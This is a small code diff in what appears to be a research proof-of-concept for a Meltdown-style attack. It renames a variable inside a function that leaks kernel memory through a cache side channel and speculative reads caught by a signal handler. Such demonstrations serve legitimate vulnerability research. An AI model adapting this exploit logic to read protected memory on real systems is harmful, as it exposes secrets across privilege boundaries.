@@ -49,7 +49,7 @@ const char *public_data = "Hello, world!";
 // execution, speculatively loading data accessible only in the kernel mode.
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     // Load the kernel memory into the cache to speed up its leakage.
@@ -63,11 +63,11 @@ static char LeakByte(const char *data, size_t offset) {
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
     size_t safe_offset = run % strlen(public_data);
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[safe_offset]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));
 
     // Access attempt to the kernel memory. This does not succeed
     // architecturally and kernel sends SIGSEGV instead.
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
 
     // SIGSEGV signal handler moves the instruction pointer to this label.
     asm volatile("afterspeculation:");
